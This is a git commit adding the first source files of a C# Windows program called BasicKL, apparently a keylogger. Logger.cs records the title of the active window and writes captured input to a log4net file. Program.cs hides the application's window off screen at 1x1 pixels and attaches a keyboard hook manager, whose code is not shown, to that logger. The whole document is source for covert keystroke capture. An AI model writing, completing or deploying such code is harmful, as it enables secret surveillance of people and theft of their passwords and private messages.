116d811c15ca7ce85411bab9739521a7c5a9aadc
Matt Dennis <msd7734@rit.edu>
2017-04-10 07:23:00 -0400

    Initial commit

---
+++ BasicKL/Logger.cs
@@ -0,0 +1,76 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Configuration;
+
+using log4net;
+using log4net.Appender;
+using log4net.Repository;
+using log4net.Repository.Hierarchy;
+
+namespace BasicKL
+{
+    public class Logger
+    {
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
+        private static readonly log4net.ILog log = log4net.LogManager.GetLogger(typeof(Logger));
+
+        private string activeWndTitle;
+        private Guid guid;
+
+        public Logger(Guid guid)
+        {
+            this.guid = guid;
+            
+            log.Info(String.Format("\n{0:d/M/yyyy HH:mm:ss}", DateTime.Now) + " - " + guid.ToString());
+            log.Info("\nStarting in "+GetLogPath());
+            activeWndTitle = GetActiveWindowTitle();
+            log.Info(String.Format("\n\n===\n{0}\n===\n", activeWndTitle));
+        }
+
+        public void Log(string msg)
+        {
+            string curWndTitle = GetActiveWindowTitle();
+            if (curWndTitle != activeWndTitle)
+            {
+                log.Info(String.Format("\n\n===\n{0}\n===\n", curWndTitle));
+                activeWndTitle = curWndTitle;
+            }
+
+            log.Info(msg);
+        }
+
+        public string GetLogPath()
+        {
+            var root = LogManager.GetRepository()
+                .GetAppenders()
+                .OfType<FileAppender>()
+                .FirstOrDefault();
+
+            //force create file first
+            log.Info("");
+            return root.File;
+        }
+
+        private string GetActiveWindowTitle()
+        {
+            const int nChars = 256;
+            StringBuilder buf = new StringBuilder(nChars);
+            IntPtr handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, buf, nChars) > 0)
+            {
+                return buf.ToString();
+            }
+            return null;
+        }
+    }
+}
---
+++ BasicKL/Program.cs
@@ -0,0 +1,53 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Configuration;
+
+using log4net;
+
+[assembly: log4net.Config.XmlConfigurator(Watch = true)]
+
+namespace BasicKL
+{
+    static class Program
+    {
+
+        /// <summary>
+        /// The main entry point for the application.
+        /// </summary>
+        [STAThread]
+        static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+
+            Guid gid;
+            string id = ConfigurationManager.AppSettings["myId"];
+            bool validId = Guid.TryParse(id, out gid);
+
+            if (!validId)
+            {
+                gid = Guid.NewGuid();
+                ConfigurationManager.AppSettings["myId"] = gid.ToString();
+            }
+
+            Logger log = new Logger(gid);
+
+            Form1 form = new Form1(log);
+            form.FormBorderStyle = FormBorderStyle.FixedToolWindow;
+            form.StartPosition = FormStartPosition.Manual;
+            form.Location = new System.Drawing.Point(-2000, -2000);
+            form.Size = new System.Drawing.Size(1, 1);
+
+            
+
+            using (KeyHookManager khm = new KeyHookManager(log.Log))
+            {
+                //log.Info(Convert.ToString((int)Keys.Control) + " ?=? " + Convert.ToString(0x10));
+                Application.Run(form);
+            }
+        }
+    }
+}
